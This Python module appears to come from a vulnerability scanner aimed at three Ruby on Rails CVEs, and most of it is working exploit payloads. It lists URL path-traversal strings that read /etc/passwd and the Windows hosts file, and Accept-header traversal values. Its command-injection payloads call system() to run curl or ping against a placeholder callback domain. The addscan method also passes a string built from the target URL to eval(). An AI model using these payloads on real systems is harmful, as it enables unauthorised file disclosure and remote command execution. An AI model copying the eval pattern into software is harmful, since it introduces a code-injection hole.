#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Ruby On Rails 是著名的Ruby Web开发框架
    Ruby on Rails扫描类: 
        1. Ruby on Rails 路径遍历
            CVE-2018-3760
                Payload: https://vulhub.org/#/environments/rails/CVE-2018-3760/

        2. Ruby on Rails 路径穿越与任意文件读取
            CVE-2019-5418
                Payload: https://vulhub.org/#/environments/rails/CVE-2019-5418/

        3. Ruby on Rails 命令执行
            CVE-2020-8163
                Payload: https://github.com/h4ms1k/CVE-2020-8163/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from lib.tool import head
from payloads.RubyOnRails.cve_2018_3760 import cve_2018_3760_scan
from payloads.RubyOnRails.cve_2019_5418 import cve_2019_5418_scan
from payloads.RubyOnRails.cve_2020_8163 import cve_2020_8163_scan

class RubyOnRails():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Ruby on Rails'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2018_3760_payloads = [
            {
                'path': 'assets/file:%2f%2f/etc/passwd',
                'data': ''
            },
            {
                'path': 'assets/file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
                'data': ''
            },
            {
                'path': 'assets/file:%2f%2f/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': 'assets/file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': 'file:%2f%2f/etc/passwd',
                'data': ''
            },
            {
                'path': 'file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
                'data': ''
            },
            {
                'path': 'file:%2f%2f/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': 'file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            }
        ]

        self.cve_2019_5418_payloads = [
            {
                'path': '',
                'data': '',
                'headers': head.merge(self.headers, {
                    'Accept': '../../../../../../../../etc/passwd{{'
                })
            },
            {
                'path': '',
                'data': '',
                'headers': head.merge(self.headers, {
                    'Accept': '../../../../../../../../C:/Windows/System32/drivers/etc/hosts{{'
                })
            },
            {
                'path': '',
                'data': '',
                'headers': head.merge(self.headers, {
                    'Accept': '../../../../../../../../C:\Windows\System32\drivers\etc\hosts{{'
                })
            }
        ]

        self.cve_2020_8163_payloads = [
            {
                'path': '?[system("curl DNSdomain")end%00]',
                'data': ''
            },
            {
                'path': '?[system("ping -c 4 DNSdomain")end%00]',
                'data': ''
            },
            {
                'path': '?[system("ping DNSdomain")end%00]',
                'data': ''
            }
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2018_3760_scan, url=url),
            thread(target=self.cve_2019_5418_scan, url=url),
            thread(target=self.cve_2020_8163_scan, url=url)
        ]

RubyOnRails.cve_2018_3760_scan = cve_2018_3760_scan
RubyOnRails.cve_2019_5418_scan = cve_2019_5418_scan
RubyOnRails.cve_2020_8163_scan = cve_2020_8163_scan

rails = RubyOnRails()
